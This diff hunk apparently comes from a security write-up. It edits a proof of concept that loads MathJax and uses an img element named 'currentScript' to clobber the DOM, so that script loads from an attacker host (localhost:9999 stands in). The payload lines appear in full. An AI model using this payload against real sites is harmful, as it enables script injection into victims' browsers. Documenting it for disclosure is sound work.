@@ -64,13 +64,13 @@ app.listen(port, () => {
 
 ### PoC #1
 
-```
+```html
 <!--Library-->
 <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
 $$\require{tex}$$
 <!--Library-->
 
 <!--Payload-->
-<img name="currentScript" src="https://localhost:9999"></img>
+<img name="currentScript" src="http://localhost:9999"></img>
 <!--Payload-->
 ```
